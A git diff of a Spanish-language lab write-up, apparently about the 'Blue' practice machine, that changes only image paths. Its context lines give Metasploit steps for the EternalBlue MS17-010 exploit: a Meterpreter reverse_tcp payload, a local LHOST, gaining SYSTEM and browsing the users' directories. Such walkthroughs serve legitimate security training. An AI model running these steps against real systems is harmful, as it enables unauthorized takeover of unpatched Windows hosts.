@@ -81,28 +81,28 @@ Primero iniciamos Metasploit:
 ```bash
 msfconsole
 ```
-![msfconsole](./imagenes/msfconsole.png)
+![msfconsole](Maquinas_de_Windows/Blue/imagenes/msfconsole.png)
 
 Buscamos el exploit correspondiente:
 
 ```bash
 search ms17-010
 ```
-![search](./imagenes/search.png)
+![search](Maquinas_de_Windows/Blue/imagenes/search.png)
 
 Seleccionamos el módulo:
 
 ```bash
 use exploit/windows/smb/ms17_010_eternalblue
 ```
-![use](./imagenes/use0.png)
+![use](Maquinas_de_Windows/Blue/imagenes/use0.png)
 
 Se establece el payload con el siguiente comando:
 
 ```bash
 set payload windows/x64/meterpreter/reverse_tcp
 ```
-![payload](./imagenes/meterpreter.png)
+![payload](Maquinas_de_Windows/Blue/imagenes/meterpreter.png)
 
 Configuramos la IP de la máquina objetivo:
 
@@ -114,13 +114,13 @@ Configuramos nuestra IP local para recibir la conexión inversa:
 ```bash
 set LHOST 192.168.177.226
 ```
-![RHOST y LHOST](./imagenes/reverse.png)
+![RHOST y LHOST](Maquinas_de_Windows/Blue/imagenes/reverse.png)
 
 Mostramos las opciones configuradas:
 ```bash
 show options
 ```
-![show options](./imagenes/showoptions.png)
+![show options](Maquinas_de_Windows/Blue/imagenes/showoptions.png)
 
 
 ## 6. Ejecución del exploit
@@ -144,7 +144,7 @@ El resultado es:
 ```bash
 NT AUTHORITY\SYSTEM
 ```
-![getuid](./imagenes/getuid.png)
+![getuid](Maquinas_de_Windows/Blue/imagenes/getuid.png)
 
 Esto indica que tenemos privilegios administrativos completos sobre el sistema.
 En Windows, la cuenta SYSTEM posee incluso más privilegios que un administrador tradicional.
@@ -179,7 +179,7 @@ Navegar entre directorios:
 ```bash
 cd
 ```
-![comandos](./imagenes/comandos.png)
+![comandos](Maquinas_de_Windows/Blue/imagenes/comandos.png)
 
 ## 8.3 Gestión de sesiones en Metasploit
 
@@ -196,11 +196,11 @@ Para interactuar con una sesión concreta se utiliza:
 ```bash
 sessions -i 1
 ```
-![sesion](./imagenes/sesion1.png)
+![sesion](Maquinas_de_Windows/Blue/imagenes/sesion1.png)
 
 Para guardar la sesion se le da a Ctrl + Z, le damos a y para guardar:
 
-![sesiones](./imagenes/guardarsesion.PNG)
+![sesiones](Maquinas_de_Windows/Blue/imagenes/guardarsesion.PNG)
 
 Esto permite volver a controlar la sesión Meterpreter activa.
 Si se desea cerrar una sesión se puede usar:
@@ -215,7 +215,7 @@ Para ver los usuarios existentes en el sistema accedemos al directorio de usuari
 cd C:\Users
 ls
 ```
-![sesiones](./imagenes/sesiones.png)
+![sesiones](Maquinas_de_Windows/Blue/imagenes/sesiones.png)
 
 A partir de aquí es posible explorar los directorios de cada usuario 
 para analizar el sistema comprometido.
